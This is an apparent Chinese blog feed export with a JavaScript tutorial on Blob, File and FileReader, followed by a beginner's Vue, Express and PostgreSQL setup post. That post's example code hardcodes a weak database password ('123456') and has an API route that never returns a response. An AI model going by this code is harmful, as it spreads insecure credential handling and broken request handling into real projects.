<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> htmlFragment = [<span class="string">&#x27;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> myBlob = <span class="keyword">new</span> Blob(htmlFragment, &#123;<span class="attr">type</span> : <span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，实例对象<code>myBlob</code>包含的是字符串。生成实例的时候，数据类型指定为<code>text/html</code>。</p>
<p>下面是另一个例子，Blob 保存 JSON 数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123; <span class="attr">hello</span>: <span class="string">&#x27;world&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([ <span class="built_in">JSON</span>.stringify(obj) ], &#123;<span class="attr">type</span> : <span class="string">&#x27;application/json&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="11-2-2-实例属性和实例方法"><a href="#11-2-2-实例属性和实例方法" class="headerlink" title="11.2.2 实例属性和实例方法"></a>11.2.2 实例属性和实例方法</h5><p><code>Blob</code>具有两个实例属性<code>size</code>和<code>type</code>，分别返回数据的大小和类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> htmlFragment = [<span class="string">&#x27;&lt;a id=&quot;a&quot;&gt;&lt;b id=&quot;b&quot;&gt;hey!&lt;/b&gt;&lt;/a&gt;&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> myBlob = <span class="keyword">new</span> Blob(htmlFragment, &#123;<span class="attr">type</span> : <span class="string">&#x27;text/html&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">myBlob.size <span class="comment">// 32</span></span><br><span class="line">myBlob.type <span class="comment">// &quot;text/html&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>Blob</code>具有一个实例方法<code>slice</code>，用来拷贝原来的数据，返回的也是一个<code>Blob</code>实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">myBlob.slice(start, end, contentType)</span><br></pre></td></tr></table></figure>
<p><code>slice</code>方法有三个参数，都是可选的。它们依次是起始的字节位置（默认为0）、结束的字节位置（默认为<code>size</code>属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。</p>
<h5 id="11-2-3-获取文件信息"><a href="#11-2-3-获取文件信息" class="headerlink" title="11.2.3 获取文件信息"></a>11.2.3 获取文件信息</h5><p>文件选择器<code>&lt;input type=&quot;file&quot;&gt;</code>用来让用户选取文件。出于安全考虑，浏览器不允许脚本自行设置这个控件的<code>value</code>属性，即文件必须是用户手动选取的，不能是脚本指定的。一旦用户选好了文件，脚本就可以读取这个文件。</p>
<p>文件选择器返回一个 FileList 对象，该对象是一个类似数组的成员，每个成员都是一个 File 实例对象。File 实例对象是一个特殊的 Blob 实例，增加了<code>name</code>和<code>lastModifiedDate</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; accept=&quot;image/*&quot; multiple onchange=&quot;fileinfo(this.files)&quot;/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileinfo</span>(<span class="params">files</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> f = files[i];</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      f.name, <span class="comment">// 文件名，不含路径</span></span><br><span class="line">      f.size, <span class="comment">// 文件大小，Blob 实例属性</span></span><br><span class="line">      f.type, <span class="comment">// 文件类型，Blob 实例属性</span></span><br><span class="line">      f.lastModifiedDate <span class="comment">// 文件的最后修改时间</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了文件选择器，拖放 API 的<code>dataTransfer.files</code>返回的也是一个FileList 对象，它的成员因此也是 File 实例对象。</p>
<h5 id="11-2-4-下载文件"><a href="#11-2-4-下载文件" class="headerlink" title="11.2.4 下载文件"></a>11.2.4 下载文件</h5><p>AJAX 请求时，如果指定<code>responseType</code>属性为<code>blob</code>，下载下来的就是一个 Blob 对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBlob</span>(<span class="params">url, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;GET&#x27;</span>, url);</span><br><span class="line">  xhr.responseType = <span class="string">&#x27;blob&#x27;</span>;</span><br><span class="line">  xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    callback(xhr.response);</span><br><span class="line">  &#125;</span><br><span class="line">  xhr.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>xhr.response</code>拿到的就是一个 Blob 对象。</p>
<h5 id="11-2-5-生成-URL"><a href="#11-2-5-生成-URL" class="headerlink" title="11.2.5 生成 URL"></a>11.2.5 生成 URL</h5><p>浏览器允许使用<code>URL.createObjectURL()</code>方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以<code>blob://</code>开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与<code>data://URL</code>（URL 包含实际数据）和<code>file://URL</code>（本地文件系统里面的文件）都不一样。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> droptarget = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;droptarget&#x27;</span>);</span><br><span class="line"></span><br><span class="line">droptarget.ondrop = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> files = e.dataTransfer.files;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> type = files[i].type;</span><br><span class="line">    <span class="keyword">if</span> (type.substring(<span class="number">0</span>,<span class="number">6</span>) !== <span class="string">&#x27;image/&#x27;</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.src = URL.createObjectURL(files[i]);</span><br><span class="line">    img.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.width = <span class="number">100</span>;</span><br><span class="line">      <span class="built_in">document</span>.body.appendChild(<span class="built_in">this</span>);</span><br><span class="line">      URL.revokeObjectURL(<span class="built_in">this</span>.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码通过为拖放的图片文件生成一个 URL，产生它们的缩略图，从而使得用户可以预览选择的文件。</p>
<p>浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。</p>
<h5 id="11-2-6-读取文件"><a href="#11-2-6-读取文件" class="headerlink" title="11.2.6 读取文件"></a>11.2.6 读取文件</h5><p>取得 Blob 对象以后，可以通过<code>FileReader</code>对象，读取 Blob 对象的内容，即文件内容。</p>
<p>FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。</p>
<ul>
<li><code>FileReader.readAsText()</code>：返回文本，需要指定文本编码，默认为 UTF-8。</li>
<li><code>FileReader.readAsArrayBuffer()</code>：返回 ArrayBuffer 对象。</li>
<li><code>FileReader.readAsDataURL()</code>：返回 Data URL。</li>
<li><code>FileReader.readAsBinaryString()</code>：返回原始的二进制字符串。</li>
</ul>
<p>下面是<code>FileReader.readAsText()</code>方法的例子，用来读取文本文件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; onchange=&quot;readfile(this.files[0])&quot;&gt;&lt;/input&gt;</span></span><br><span class="line"><span class="comment">// &lt;pre id=&quot;output&quot;&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">  reader.readAsText(f);</span><br><span class="line">  reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text = reader.result;</span><br><span class="line">    <span class="keyword">var</span> out = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;output&#x27;</span>);</span><br><span class="line">    out.innerHTML = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    out.appendChild(<span class="built_in">document</span>.createTextNode(text));</span><br><span class="line">  &#125;</span><br><span class="line">  reader.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Error&#x27;</span>, e);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，通过指定 FileReader 实例对象的<code>onload</code>监听函数，在实例的<code>result</code>属性上拿到文件内容。</p>
<p>下面是<code>FileReader.readAsArrayBuffer()</code>方法的例子，用于读取二进制文件。</p>
<pre><code class="js">// HTML 代码如下
// &lt;input type=&quot;file&quot; onchange=&quot;typefile(this.files[0])&quot;&gt;&lt;/input&gt;
function typefile(file) &#123;
  // 文件开头的四个字节，生成一个 Blob 对象
  var slice = file.slice(0, 4);
  var reader = new FileReader();
  // 读取这四个字节
  reader.readAsArrayBuffer(slice);
  reader.onload = function (e) &#123;
    var buffer = reader.result;
    // 将这四个字节的内容，视作一个32位整数
    var view = new DataView(buffer);
    var magic = view.getUint32(0, false);
    // 根据文件的前四个字节，判断它的类型
    switch(magic) &#123;
      case 0x89504E47: file.verified_type = &#39;image/png&#39;; break;
      case 0x47494638: file.verified_type = &#39;image/gif&#39;; break;
      case 0x25504446: file.verified_type = &#39;application/pdf&#39;; break;
      case 0x504b0304: file.verified_type = &#39;application/zip&#39;; break;
    &#125;
    console.log(file.name, file.verified_type);
  &#125;;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-ArrayBuffer 对象，Blob 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0066</title>
    <url>/2021/06/03/%E6%89%93%E5%8D%A10066/</url>
    <content><![CDATA[<p><font color=#c1a173>存储阳光，必有远芳；心中有暖，又何惧人生荒凉。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="12-File-对象，FileList-对象，FileReader-对象"><a href="#12-File-对象，FileList-对象，FileReader-对象" class="headerlink" title="12. File 对象，FileList 对象，FileReader 对象"></a>12. File 对象，FileList 对象，FileReader 对象</h3><h4 id="12-1-File-对象"><a href="#12-1-File-对象" class="headerlink" title="12.1 File 对象"></a>12.1 File 对象</h4><p>File 对象代表一个文件，用来读写文件信息。它继承了 Blob 对象，或者说是一种特殊的 Blob 对象，所有可以使用 Blob 对象的场合都可以使用它。</p>
<p>最常见的使用场合是表单的文件上传控件（<code>&lt;input type=&quot;file&quot;&gt;</code>），用户选中文件以后，浏览器就会生成一个数组，里面是每一个用户选中的文件，它们都是 File 实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> file = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;fileItem&#x27;</span>).files[<span class="number">0</span>];</span><br><span class="line">file <span class="keyword">instanceof</span> File <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>file</code>是用户选中的第一个文件，它是 File 的实例。</p>
<span id="more"></span>
<h5 id="12-1-1-构造函数"><a href="#12-1-1-构造函数" class="headerlink" title="12.1.1 构造函数"></a>12.1.1 构造函数</h5><p>浏览器原生提供一个<code>File()</code>构造函数，用来生成 File 实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> File(array, name [, options])</span><br></pre></td></tr></table></figure>
<p><code>File()</code>构造函数接受三个参数。</p>
<ul>
<li><code>array</code>：一个数组，成员可以是二进制对象或字符串，表示文件的内容。</li>
<li><code>name</code>：字符串，表示文件名或文件路径。</li>
<li><code>options</code>：配置对象，设置实例的属性。该参数可选。</li>
</ul>
<p>第三个参数配置对象，可以设置两个属性。</p>
<ul>
<li><code>type</code>：字符串，表示实例对象的 MIME 类型，默认值为空字符串。</li>
<li><code>lastModified</code>：时间戳，表示上次修改的时间，默认为<code>Date.now()</code>。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> file = <span class="keyword">new</span> File(</span><br><span class="line">  [<span class="string">&#x27;foo&#x27;</span>],</span><br><span class="line">  <span class="string">&#x27;foo.txt&#x27;</span>,</span><br><span class="line">  &#123;</span><br><span class="line">    type: <span class="string">&#x27;text/plain&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h5 id="12-1-2-实例属性和实例方法"><a href="#12-1-2-实例属性和实例方法" class="headerlink" title="12.1.2 实例属性和实例方法"></a>12.1.2 实例属性和实例方法</h5><p>File 对象有以下实例属性。</p>
<ul>
<li><code>File.lastModified</code>：最后修改时间</li>
<li><code>File.name</code>：文件名或文件路径</li>
<li><code>File.size</code>：文件大小（单位字节）</li>
<li><code>File.type</code>：文件的 MIME 类型</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myFile = <span class="keyword">new</span> File([], <span class="string">&#x27;file.bin&#x27;</span>, &#123;</span><br><span class="line">  lastModified: <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="number">2018</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">&#125;);</span><br><span class="line">myFile.lastModified <span class="comment">// 1517414400000</span></span><br><span class="line">myFile.name <span class="comment">// &quot;file.bin&quot;</span></span><br><span class="line">myFile.size <span class="comment">// 0</span></span><br><span class="line">myFile.type <span class="comment">// &quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>myFile</code>的内容为空，也没有设置 MIME 类型，所以<code>size</code>属性等于<code>0</code>，<code>type</code>属性等于空字符串。</p>
<p>File 对象没有自己的实例方法，由于继承了 Blob 对象，因此可以使用 Blob 的实例方法<code>slice()</code>。</p>
<h4 id="12-2-FileList-对象"><a href="#12-2-FileList-对象" class="headerlink" title="12.2 FileList 对象"></a>12.2 FileList 对象</h4><p><code>FileList</code>对象是一个类似数组的对象，代表一组选中的文件，每个成员都是一个 File 实例。它主要出现在两个场合。</p>
<p>文件控件节点（<code>&lt;input type=&quot;file&quot;&gt;</code>）的<code>files</code>属性，返回一个 FileList 实例。<br>拖拉一组文件时，目标区的<code>DataTransfer.files</code>属性，返回一个 FileList 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input id=&quot;fileItem&quot; type=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> files = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;fileItem&#x27;</span>).files;</span><br><span class="line">files <span class="keyword">instanceof</span> FileList <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，文件控件的<code>files</code>属性是一个 FileList 实例。</p>
<p>FileList 的实例属性主要是<code>length</code>，表示包含多少个文件。</p>
<p>FileList 的实例方法主要是<code>item()</code>，用来返回指定位置的实例。它接受一个整数作为参数，表示位置的序号（从零开始）。但是，由于 FileList 的实例是一个类似数组的对象，可以直接用方括号运算符，即<code>myFileList[0]</code>等同于<code>myFileList.item(0)</code>，所以一般用不到<code>item()</code>方法。</p>
<h4 id="12-3-FileReader-对象"><a href="#12-3-FileReader-对象" class="headerlink" title="12.3 FileReader 对象"></a>12.3 FileReader 对象</h4><p>FileReader 对象用于读取 File 对象或 Blob 对象所包含的文件内容。</p>
<p>浏览器原生提供一个<code>FileReader</code>构造函数，用来生成 FileReader 实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br></pre></td></tr></table></figure>
<p>FileReader 有以下的实例属性。</p>
<ul>
<li><code>FileReader.error</code>:读取文件时产生的错误对象</li>
<li><code>FileReader.readyState</code>:整数，表示读取文件时的当前状态。一共有三种可能的状态，<code>0</code>表示尚未加载任何数据，<code>1</code>表示数据正在加载，<code>2</code>表示加载完成。</li>
<li><code>FileReader.result</code>:读取完成后的文件内容，有可能是字符串，也可能是一个 ArrayBuffer 实例。</li>
<li><code>FileReader.onabort</code>:<code>abort</code>事件（用户终止读取操作）的监听函数。</li>
<li><code>FileReader.onerror</code>:<code>error</code>事件（读取错误）的监听函数。</li>
<li><code>FileReader.onload</code>:<code>load</code>事件（读取操作完成）的监听函数，通常在这个函数里面使用<code>result</code>属性，拿到文件内容。</li>
<li><code>FileReader.onloadstart</code>:<code>loadstart</code>事件（读取操作开始）的监听函数。</li>
<li><code>FileReader.onloadend</code>:<code>loadend</code>事件（读取操作结束）的监听函数。</li>
<li><code>FileReader.onprogress</code>:<code>progress</code>事件（读取操作进行中）的监听函数。</li>
</ul>
<p>下面是监听<code>load</code>事件的一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;file&quot; onchange=&quot;onChange(event)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onChange</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = event.target.files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">  reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event.target.result)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  reader.readAsText(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，每当文件控件发生变化，就尝试读取第一个文件。如果读取成功（<code>load</code>事件发生），就打印出文件内容。</p>
<p>FileReader 有以下实例方法。</p>
<ul>
<li>FileReader.abort()：终止读取操作，<code>readyState</code>属性将变成<code>2</code>。</li>
<li>FileReader.readAsArrayBuffer()：以 ArrayBuffer 的格式读取文件，读取完成后<code>result</code>属性将返回一个 ArrayBuffer 实例。</li>
<li>FileReader.readAsBinaryString()：读取完成后，<code>result</code>属性将返回原始的二进制字符串。</li>
<li>FileReader.readAsDataURL()：读取完成后，<code>result</code>属性将返回一个 Data URL 格式（Base64 编码）的字符串，代表文件内容。对于图片文件，这个字符串可以用于<code>&lt;img&gt;</code>元素的<code>src</code>属性。注意，这个字符串不能直接进行 Base64 解码，必须把前缀<code>data:*/*;base64</code>,从字符串里删除以后，再进行解码。</li>
<li>FileReader.readAsText()：读取完成后，<code>result</code>属性将返回文件内容的文本字符串。该方法的第一个参数是代表文件的 Blob 实例，第二个参数是可选的，表示文本编码，默认为 UTF-8。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;input type=&quot;file&quot; onchange=&quot;previewFile()&quot;&gt;</span></span><br><span class="line"><span class="comment">  &lt;img src=&quot;&quot; height=&quot;200&quot;&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">previewFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> preview = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> file    = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;input[type=file]&#x27;</span>).files[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">var</span> reader  = <span class="keyword">new</span> FileReader();</span><br><span class="line"></span><br><span class="line">  reader.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    preview.src = reader.result;</span><br><span class="line">  &#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (file) &#123;</span><br><span class="line">    reader.readAsDataURL(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，用户选中图片文件以后，脚本会自动读取文件内容，然后作为一个 Data URL 赋值给<code>&lt;img&gt;</code>元素的<code>src</code>属性，从而把图片展示出来。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-File 对象，FileList 对象，FileReader 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0068</title>
    <url>/2021/06/04/%E6%89%93%E5%8D%A10068/</url>
    <content><![CDATA[<p><font color=#faa755>要保持希望在每天清晨太阳升起。</font><br>菜鸟一个，一直没搞明白Vue和Node项目环境的搭建，处在雾里，昨晚终于卷完了，记录一下。<br>如果有人能看到，欢迎留言！</p>
<span id="more"></span>
<h3 id="1-初始化Vue项目"><a href="#1-初始化Vue项目" class="headerlink" title="1. 初始化Vue项目"></a>1. 初始化Vue项目</h3><ol>
<li><p>创建Vue项目,我这里是直接用的<a href="https://github.com/PanJiaChen/vue-admin-template">vue-admin-tamplate</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">vue create projectName</span><br></pre></td></tr></table></figure></li>
<li><p>下载express模块</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install express</span><br></pre></td></tr></table></figure></li>
<li><p>下载pg模块</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install pg</span><br></pre></td></tr></table></figure></li>
<li><p>下载axios模块</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install axios</span><br></pre></td></tr></table></figure></li>
<li><p>启动项目</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/04/p5Df2xB1Y3UaZne.png" alt="运行成功"></p>
</li>
</ol>
<h3 id="2-创建一个服务器"><a href="#2-创建一个服务器" class="headerlink" title="2. 创建一个服务器"></a>2. 创建一个服务器</h3><h5 id="1-在根项目中创建pgsql文件夹，然后再pgsql文件夹中创建js文件以及api文件夹"><a href="#1-在根项目中创建pgsql文件夹，然后再pgsql文件夹中创建js文件以及api文件夹" class="headerlink" title="1. 在根项目中创建pgsql文件夹，然后再pgsql文件夹中创建js文件以及api文件夹"></a>1. 在根项目中创建pgsql文件夹，然后再pgsql文件夹中创建js文件以及api文件夹</h5><p><img src="https://i.loli.net/2021/06/04/xG674f5dqTFOvzs.png" alt="目录"></p>
<ul>
<li><p><code>db.js</code>用来添加数据库配置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  pgsql:&#123;</span><br><span class="line">    user:<span class="string">&#x27;postgres&#x27;</span>,</span><br><span class="line">    database:<span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    password:<span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    port:<span class="number">5432</span>,</span><br><span class="line">    max:<span class="number">20</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>index.js</code>是Express服务器入口文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用 express 创建服务器</span></span><br><span class="line"><span class="comment">// 导入 express 模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">// 调用 express 函数，返回一个数据库实例</span></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入路由模块</span></span><br><span class="line"><span class="keyword">const</span> testApi = <span class="built_in">require</span>(<span class="string">&#x27;./api/testApi&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册全局解析中间件</span></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册路由模块</span></span><br><span class="line">app.use(<span class="string">&#x27;/api/test&#x27;</span>, testApi);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 app.listen() 启动服务器</span></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function">() =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">&#x27;FUCKED 3000&#x27;</span>);&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p><code>sqlMap.js</code>用来存放sql语句，供api逻辑调用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  test:&#123;</span><br><span class="line">    get:<span class="string">&#x27;SELECT flt_rte_cd,SUM(pax_qty) AS nums FROM testthree GROUP BY flt_rte_cd&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><code>api/testApi.js</code> api示例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> db = <span class="built_in">require</span>(<span class="string">&#x27;../db&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pgsql = <span class="built_in">require</span>(<span class="string">&#x27;pg&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> $sql = <span class="built_in">require</span>(<span class="string">&#x27;../sqlMap&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建连接池</span></span><br><span class="line"><span class="keyword">let</span> conn = <span class="keyword">new</span> pgsql.Pool(db.pgsql);</span><br><span class="line"><span class="comment">//数据池链接</span></span><br><span class="line">conn.connect();</span><br><span class="line"></span><br><span class="line"><span class="comment">//增加用户接口</span></span><br><span class="line"><span class="comment">//GET</span></span><br><span class="line">router.get(<span class="string">&#x27;/getList&#x27;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> sql = $sql.test.get;</span><br><span class="line">  <span class="keyword">let</span> params = req.query;</span><br><span class="line">  <span class="built_in">console</span>.log(params);</span><br><span class="line">  conn.query(sql,<span class="function">(<span class="params">err,result</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(err)  <span class="keyword">return</span> <span class="built_in">console</span>.log(err);</span><br><span class="line">    <span class="built_in">console</span>.log(res,result);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure></li>
</ul>
<h5 id="2-进入serve目录下，执行index文件"><a href="#2-进入serve目录下，执行index文件" class="headerlink" title="2. 进入serve目录下，执行index文件"></a>2. 进入serve目录下，执行index文件</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">node index.js</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/06/04/OfKSGhBQFD1u4j6.png" alt="node index.js"></p>
<h3 id="3-编写vue文件"><a href="#3-编写vue文件" class="headerlink" title="3. 编写vue文件"></a>3. 编写vue文件</h3><h5 id="1-随便找一个vue文件测试一下"><a href="#1-随便找一个vue文件测试一下" class="headerlink" title="1. 随便找一个vue文件测试一下"></a>1. 随便找一个vue文件测试一下</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div style=<span class="string">&quot;padding:30px;&quot;</span>&gt;</span><br><span class="line">     &lt;a href=<span class="string">&quot;javascript:;&quot;</span> @click=<span class="string">&quot;getUser&quot;</span>&gt;获取&lt;/a&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    methods:&#123;</span><br><span class="line">      <span class="function"><span class="title">getUser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.$http.get(<span class="string">&quot;/api/test/getList&quot;</span>)</span><br><span class="line">        